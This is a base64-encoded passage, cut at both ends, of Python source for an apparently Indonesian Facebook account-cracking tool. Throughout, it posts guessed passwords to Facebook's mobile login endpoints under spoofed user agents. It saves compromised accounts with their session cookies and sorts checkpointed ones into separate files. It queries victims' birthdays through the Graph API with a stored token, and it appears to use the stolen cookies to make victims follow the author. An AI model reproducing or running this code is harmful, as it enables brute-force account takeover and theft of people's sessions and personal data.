NoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20iLCJjb250ZW50LXR5cGUiOiJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLCJ1c2VyLWFnZW50Ijp1YSwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45IiwieC1yZXF1ZXN0ZWQtd2l0aCI6Im1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiJzYW1lLW9yaWdpbiIsInNlYy1mZXRjaC1tb2RlIjoibmF2aWdhdGUiLCJzZWMtZmV0Y2gtdXNlciI6Ij8xIiwic2VjLWZldGNoLWRlc3QiOiJkb2N1bWVudCIsInJlZmVyZXIiOiJodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vaW5kZXgucGhwP25leHQ9aHR0cHMlM0ElMkYlMkZkZXZlbG9wZXJzLmZhY2Vib29rLmNvbSUyRnRvb2xzJTJGZGVidWclMkZhY2Nlc3N0b2tlbiUyRiIsImFjY2VwdC1lbmNvZGluZyI6Imd6aXAsIGRlZmxhdGUiLCJhY2NlcHQtbGFuZ3VhZ2UiOiJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyJ9KQ0KICAgICAgICAgICAgcG8gPSBzZXMucG9zdCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsgDQogICAgICAgICAgICBlbGlmICdjaGVja3BvaW50JyBpbiBzZXMuY29va2llcy5nZXRfZGljdCgpOg0KICAgICAgICAgICAgICAgIGlmICJtdW5jdWwiIGluIHNlbGYub3BzaV9jOg0KICAgICAgICAgICAgCSAgICB0cnk6DQogICAgICAgICAgICAJICAgICAgICByb216ID0gb3BlbignZGF0YS90b2tlbi50eHQnKS5yZWFkKCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGxhaGlyID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8lcz9hY2Nlc3NfdG9rZW49JXMnJSh1c2VyLHJvbXopKS5qc29uKClbJ2JpcnRoZGF5J10NCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoLCBkYXksIHllYXIgPSBsYWhpci5zcGxpdCgnLycpDQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmNyNGNrKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAgICAgCWRheSA9ICcnDQogICAgICAgICAgICAgICAgICAgICAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgICAgIHNlbGYuY3IzY2sodXNlcixwdykNCiAgICAgICAgICAgICAgICAgICAgY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgICAgIGVsaWYgImdrX211bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAgICAgCXRyeToNCiAgICAgICAgICAgICAgICAJICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgIAkgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgIAkgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAJICAgIHByaW50ICdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlcyAgJyAlIChLLHVzZXIscHcsZGF5LG1vbnRoLHllYXIpDQogICAgICAgICAgICAgICAgCSAgICBjcC5hcHBlbmQoIiVzIOKXiiAlcyDil4ogJXMgJXMgJXMiJSh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIG9wZW4oJ0NQLyVzLnR4dCcgJSh3YWt0dSksICdhJykud3JpdGUoIiAqLS0+ICVzIOKXiiAlcyDil4ogJXMgJXMgJXNcbiIlICh1c2VyLHB3LGRheSxtb250aCx5ZWFyKSkNCiAgICAgICAgICAgICAgICAJICAgIGJyZWFrDQogICAgICAgICAgICAgICAgCWV4Y2VwdCBLZXlFcnJvcjoNCiAgICAgICAgICAgICAgICAJICAgIGRheSA9ICcnDQogICAgICAgICAgICAgICAgCSAgICBtb250aCAgID0gJycNCiAgICAgICAgICAgICAgICAJICAgIHllYXIgID0gJycNCiAgICAgICAgICAgICAgICAJZXhjZXB0OiBwYXNzDQogICAgICAgICAgICAgICAgCXByaW50ICdcciAlcyotLT4gJXMg4peKICVzICAgICAgICAgICAnICUgKEssdXNlcixwdykNCiAgICAgICAgICAgICAgICAJY3AuYXBwZW5kKCclcyDil4ogJXMnJSh1c2VyLHB3KSkNCiAgICAgICAgICAgICAgICAJb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzXG4iICUgKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlicmVhaw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgIAljb250aW51ZQ0KICAgICAgICBsb29wICs9IDENCiAgICAgICAgd2FybmEgPSByYW5kb20uY2hvaWNlKFtNLCBILCBLLCBCLCBVLCBPLCBQXSkNCiAgICAgICAgcHJpbnQoJ1xyJyt3YXJuYSsn4oCiXHgxYlsxOzk2bSBbY3JhY2tdICVzLyVzIFtPSzolc10tW0NQOiVzXSclKGxvb3AsbGVuKHNlbGYuaWQpLGxlbihvayksbGVuKGNwKSkpLA0KICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkNCiAgICAjIE1PQklMRQ0KICAgIGRlZiBtb2JpbChzZWxmLCB1c2VyLCBtYW51YWwsKipkYXRhKToNCiAgICAJZ2xvYmFsIG9rLGNwLGxvb3ANCiAgICAJaWYgInJhbmRvbSIgaW4gc2VsZi51Z2VuOg0KICAgIAkgICAgdHJ5Og0KICAgIAkgICAgICAgIHVhID0gcmFuZG9tLmNob2ljZShbIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjQuNDsgZW4tYXU7IFNBTVNVTkcgU00tTjkxNUcgQnVpbGQvS1RVODRQKSBBcHBsZVdlYktpdC81MzcuMzYgKEtUSE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzIuMCBDaHJvbWUvMzQuMC4xODQ3Ljc2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiTm9raWFYMy0wMi81LjAgKDA2LjA1KSBQcm9maWxlL01JRFAtMi4xIENvbmZpZ3VyYXRpb24vQ0xEQy0xLjEgTW96aWxsYS81LjAgQXBwbGVXZWJLaXQvNDIwKyAoS0hUTUwsIGxpa2UgR2Vja28pIFNhZmFyaS80MjArIiwiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10iLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNC4xLjI7IE5va2lhX1ggQnVpbGQvSlpPNTRLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMzAuMC4xNTk5LjgyIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjIuMC4xMiIsIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjEuMTsgTmF2b3JpIFFMIFN0aXggMzUwMCBCdWlsZC9MTVk0OUY7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNjcuMC4zMzk2Ljg3IFNhZmFyaS81MzcuMzYiLCJOb2tpYUMzLTAwLzUuMCAoMDcuMjApIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCBBcHBsZVdlYktpdC80MjArIChLSFRNTCwgbGlrZSBHZWNrbykgU2FmYXJpLzQyMCsiLCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiW0ZCQU4vRkI0QSxGQkFWLzIyMi4wLjAuNDguMTEzO0ZCQlYvMTU1MzIzMzY2O0ZCRE0ve2RlbnNpdHk9Mi4wLHdpZHRoPTcyMCxoZWlnaHQ9MTM2MH07RkJMQy9zcl9SUztGQlJWLzE1NjYyNTY5NjtGQkNSL210OnM7RkJNRi9IVUFXRUk7RkJCRC9IVUFXRUksLkZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL0xETi1MMjE7RkJTVi84LjAuMDtGQk9QLzE5LkZCQ0EvYXJtZWFiaS12N2E6YXJtZWFiaSxdIiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkwLjAuNDQzMC45MyBTYWZhcmkvNTM3LjM2Il0pDQogICAgICAgICAgICBleGNlcHQgSU9FcnJvcjoNCiAgICAgICAgICAgIAl1YSA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IE1pIDlUIFBybyBCdWlsZC9RS1ExLjE5MDgyNS4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODguMC40MzI0LjE4MSBNb2JpbGUgU2FmYXJpLzUzNy4zNltGQkFOL0VNQTtGQkxDL2l0X0lUO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScNCiAgICAgICAgZWxpZiAiZ2tfcmFuZG9tIiBpbiBzZWxmLnVnZW46DQogICAgICAgIAl0cnk6DQogICAgICAgIAkgICAgdWEgPSBvcGVuKCd1YS50eHQnLCAncicpLnJlYWQoKQ0KICAgICAgICAJZXhjZXB0IElPRXJyb3I6DQogICAgICAgIAkgICAgdWEgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzZbRkJBTi9FTUE7RkJMQy9pdF9JVDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nDQogICAgICAgIGZvciBwdyBpbiBtYW51YWw6DQogICAgICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgICAgIHNlcy5oZWFkZXJzLnVwZGF0ZSh7Ikhvc3QiOiJtLmZhY2Vib29rLmNvbSIsInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMiOiIxIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsImRudCI6IjEiLCJ4LXJlcXVlc3RlZC13aXRoIjoibWFyay52aWEuZ3AiLCJzZWMtZmV0Y2gtc2l0ZSI6Im5vbmUiLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS8iLCJhY2NlcHQtZW5jb2RpbmciOiJnemlwLCBkZWZsYXRlIiwiYWNjZXB0LWxhbmd1YWdlIjoiaWQtSUQsaWQ7cT0wLjksZW4tVVM7cT0wLjgsZW47cT0wLjcifSkNCiAgICAgICAgICAgIHAgPSBzZXMuZ2V0KCdodHRwczovL20uZmFjZWJvb2suY29tL2luZGV4LnBocD9uZXh0PWh0dHBzJTNBJTJGJTJGZGV2ZWxvcGVycy5mYWNlYm9vay5jb20lMkZ0b29scyUyRmRlYnVnJTJGYWNjZXNzdG9rZW4lMkYnKS50ZXh0DQogICAgICAgICAgICBkYXRhYSA9eyJsc2QiOnJlLnNlYXJjaCgnbmFtZT0ibHNkIiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwiamF6b2VzdCI6cmUuc2VhcmNoKCduYW1lPSJqYXpvZXN0IiB2YWx1ZT0iKC4qPykiJywgc3RyKHApKS5ncm91cCgxKSwidWlkIjp1c2VyLCJmbG93IjoibG9naW5fbm9fcGluIiwicGFzcyI6cHcsIm5leHQiOiJodHRwczovL2RldmVsb3BlcnMuZmFjZWJvb2suY29tL3Rvb2xzL2RlYnVnL2FjY2Vzc3Rva2VuLyJ9DQogICAgICAgICAgICBzZXMuaGVhZGVycy51cGRhdGUoeyJIb3N0IjoibS5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyI6IjEiLCJvcmlnaW4iOiJodHRwczovL20uZmFjZWJvb2suY29tIiwiY29udGVudC10eXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIiwidXNlci1hZ2VudCI6dWEsImFjY2VwdCI6InRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuOSIsIngtcmVxdWVzdGVkLXdpdGgiOiJtYXJrLnZpYS5ncCIsInNlYy1mZXRjaC1zaXRlIjoic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6Im5hdmlnYXRlIiwic2VjLWZldGNoLXVzZXIiOiI/MSIsInNlYy1mZXRjaC1kZXN0IjoiZG9jdW1lbnQiLCJyZWZlcmVyIjoiaHR0cHM6Ly9tLmZhY2Vib29rLmNvbS9pbmRleC5waHA/bmV4dD1odHRwcyUzQSUyRiUyRmRldmVsb3BlcnMuZmFjZWJvb2suY29tJTJGdG9vbHMlMkZkZWJ1ZyUyRmFjY2Vzc3Rva2VuJTJGIiwiYWNjZXB0LWVuY29kaW5nIjoiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43In0pDQogICAgICAgICAgICBwbyA9IHNlcy5wb3N0KCdodHRwczovL20uZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC92YWxpZGF0ZS1wYXNzd29yZC8/c2hibD0wJyxkYXRhPWRhdGFhLGFsbG93X3JlZGlyZWN0cz1GYWxzZSk7amVkYSgyKQ0KICAgICAgICAgICAgaWYgJ2NfdXNlcicgaW4gc2VzLmNvb2tpZXMuZ2V0X2RpY3QoKToNCiAgICAgICAgICAgIAlrdWtpcz0iOyIuam9pbihba2V5KyI9Iit2YWx1ZSBmb3Iga2V5LHZhbHVlIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQogICAgICAgICAgICAgICAgcHJpbnQgKCdcciAlcyotLT4gJXMg4peKICVzIOKXiiAlcyAnJShILHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9rLmFwcGVuZCgnJXMg4peKICVzIOKXiiAlcyclKHVzZXIscHcsa3VraXMpKQ0KICAgICAgICAgICAgICAgIG9wZW4oJ09LLyVzLnR4dCclKHdha3R1KSwgJ2EnKS53cml0ZSgnICotLT4gJXMg4peKICVzIOKXiiAlc1xuJyUodXNlcixwdyxrdWtpcykpDQogICAgICAgICAgICAgICAgaWt1dGlfZ3coa3VraXMpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIGVsaWYgJ2NoZWNrcG9pbnQnIGluIHNlcy5jb29raWVzLmdldF9kaWN0KCk6DQogICAgICAgICAgICAgICAgaWYgIm11bmN1bCIgaW4gc2VsZi5vcHNpX2M6DQogICAgICAgICAgICAJICAgIHRyeToNCiAgICAgICAgICAgIAkgICAgICAgIHJvbXogPSBvcGVuKCdkYXRhL3Rva2VuLnR4dCcpLnJlYWQoKQ0KICAgICAgICAgICAgICAgICAgICAgICAgbGFoaXIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLyVzP2FjY2Vzc190b2tlbj0lcyclKHVzZXIscm9teikpLmpzb24oKVsnYmlydGhkYXknXQ0KICAgICAgICAgICAgICAgICAgICAgICAgbW9udGgsIGRheSwgeWVhciA9IGxhaGlyLnNwbGl0KCcvJykNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuY3I0Y2sodXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgICAgICAJZGF5ID0gJycNCiAgICAgICAgICAgICAgICAgICAgICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAgICAgc2VsZi5jcjNjayh1c2VyLHB3KQ0KICAgICAgICAgICAgICAgICAgICBjcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgZWxpZiAiZ2tfbXVuY3VsIiBpbiBzZWxmLm9wc2lfYzoNCiAgICAgICAgICAgICAgICAJdHJ5Og0KICAgICAgICAgICAgICAgIAkgICAgcm9teiA9IG9wZW4oJ2RhdGEvdG9rZW4udHh0JykucmVhZCgpDQogICAgICAgICAgICAgICAgCSAgICBsYWhpciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJXM/YWNjZXNzX3Rva2VuPSVzJyUodXNlcixyb216KSkuanNvbigpWydiaXJ0aGRheSddDQogICAgICAgICAgICAgICAgCSAgICBtb250aCwgZGF5LCB5ZWFyID0gbGFoaXIuc3BsaXQoJy8nKQ0KICAgICAgICAgICAgICAgIAkgICAgcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMg4peKICVzICVzICVzICAnICUgKEssdXNlcixwdyxkYXksbW9udGgseWVhcikNCiAgICAgICAgICAgICAgICAJICAgIGNwLmFwcGVuZCgiJXMg4peKICVzIOKXiiAlcyAlcyAlcyIlKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgb3BlbignQ1AvJXMudHh0JyAlKHdha3R1KSwgJ2EnKS53cml0ZSgiICotLT4gJXMg4peKICVzIOKXiiAlcyAlcyAlc1xuIiUgKHVzZXIscHcsZGF5LG1vbnRoLHllYXIpKQ0KICAgICAgICAgICAgICAgIAkgICAgYnJlYWsNCiAgICAgICAgICAgICAgICAJZXhjZXB0IEtleUVycm9yOg0KICAgICAgICAgICAgICAgIAkgICAgZGF5ID0gJycNCiAgICAgICAgICAgICAgICAJICAgIG1vbnRoICAgPSAnJw0KICAgICAgICAgICAgICAgIAkgICAgeWVhciAgPSAnJw0KICAgICAgICAgICAgICAgIAlleGNlcHQ6IHBhc3MNCiAgICAgICAgICAgICAgICAJcHJpbnQgJ1xyICVzKi0tPiAlcyDil4ogJXMgICAgICAgICAgICcgJSAoSyx1c2VyLHB3KQ0KICAgICAgICAgICAgICAgIAljcC5hcHBlbmQoJyVzIOKXiiAlcyclKHVzZXIscHcpKQ0KICAgICAgICAgICAgICAgIAlvcGVuKCdDUC8lcy50eHQnICUod2FrdHUpLCAnYScpLndyaXRlKCIgKi0tPiAlcyDil4ogJXNcbiIgJSAodXNlcixwdykpDQogICAgICAgICAgICAgICAgCWJyZWFrDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgCWNvbnRpbnVlDQogICAgICAgIGxvb3AgKz0gMQ0KICAgICAgICB3YXJuYSA9IHJhbmRvbS5jaG9pY2UoW00sIEgsIEssIEIsIFUsIE8sIFBdKQ0KICAgICAgICBwcmludCgnXHInK3dhcm5hKyfigKJceDFiWzE7OTZtIFtjcmFja10gJXMvJXMgW09LOiVzXS1bQ1A6JXNdJyUobG9vcCxsZW4oc2VsZi5pZCksbGVuKG9rKSxsZW4oY3ApKSksDQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQ0KICAgIyBPUFNJIFNBQVQgQ1JBQ0sNCiAgICBkZWYgY3I0Y2soc2VsZix1aWQscHcsZGF5LG1vbnRoLHllYXIpOg0KICAgICAgICBzZXMgPSByZXF1ZXN0cy5TZXNzaW9uKCkNCiAgICAgICAgbWIgPSAoImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSIpDQogICAgICAgIHVhID0gKCJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBBU1VTX1owMEFEIEJ1aWxkL0xSWDIxVikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IikNCiAgICAgICAgb3B0aW9uID0gW10NCiAgICAgICAgc2VzLmhlYWRlcnMudXBkYXRlKHsiSG9zdCI6ICJtYmFzaWMuZmFjZWJvb2suY29tIiwiY2FjaGUtY29udHJvbCI6ICJtYXgtYWdlPTAiLCJ1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzIjogIjEiLCJvcmlnaW4iOiBtYiwiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsInVzZXItYWdlbnQiOiB1YSwiYWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkiLCJ4LXJlcXVlc3RlZC13aXRoIjogIm1hcmsudmlhLmdwIiwic2VjLWZldGNoLXNpdGUiOiAic2FtZS1vcmlnaW4iLCJzZWMtZmV0Y2gtbW9kZSI6ICJuYXZpZ2F0ZSIsInNlYy1mZXRjaC11c2VyIjogIj8xIiwic2VjLWZldGNoLWRlc3QiOiAiZG9jdW1lbnQiLCJyZWZlcmVyIjogbWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCJhY2NlcHQtZW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSJ9KQ0KICAgICAgICBkYXRhID0ge30NCiAgICAgICAgZ2VkID0gcGFyc2VyKHNlcy5nZXQobWIrIi9sb2dpbi8/bmV4dCZyZWY9ZGJsJmZsJnJlZmlkPTgiLCBoZWFkZXJzPXsidXNlci1hZ2VudCI6dWF9KS50ZXh0LCAiaHRtbC5wYXJzZXIiKQ0KICAgICAgICBmbSA9IGdlZC5maW5kKCJmb3JtIix7Im1ldGhvZCI6InBvc3QifSkNCiAgICAgICAgbGlzdCA9IFsibHNkIiwiamF6b2VzdCIsIm1fdHMiLCJsaSIsInRyeV9udW1iZXIiLCJ1bnJlY29nbml6ZWRfdHJpZXMiLCJsb2dpbiIsImJpX3hyd2giXQ0KICAgICAgICBmb3IgaSBpbiBmbS5maW5kX2FsbCgiaW5wdXQiKToNCiAgICAgICAgICAgIGlmIGkuZ2V0KCJuYW1lIikgaW4gbGlzdDoNCiAgICAgICAgICAgIAlkYXRhLnVwZGF0ZSh7aS5nZXQoIm5hbWUiKTppLmdldCgidmFsdWUiKX0pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgIGRhdGEudXBkYXRlKHsiZW1haWwiOnVpZCwicGFzcyI6cHd9KQ0KICAgICAgICBydW4gPSBwYXJzZXIoc2VzLnBvc3QobWIrZm0uZ2V0KCJhY3Rpb24iKSwgZGF0YT1kYXRhLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSkudGV4dCwgImh0bWwucGFyc2VyIikNCiAgICAgICAgdXJsUG9zdD1zZXMucG9zdChtYitmbS5nZXQoImFjdGlvbiIpLGRhdGE9ZGF0YSkNCiAgICAgICAgaWYgIlRlbXVrYW4gQWt1biBBbmRhIiBpbiByZS5maW5kYWxsKCJcPHRpdGxlPiguKj8pPFwvdGl0bGU+IixzdHIodXJsUG9zdC50ZXh0KSk6DQogICAgICAgIAlwcmludCgiXHIgICAgICAlcyEgbW9kZSBwZXNhd2F0a2FuIDIgZGV0aWsgICAiJShNKSkNCiAgICAgICAgaWYgImNoZWN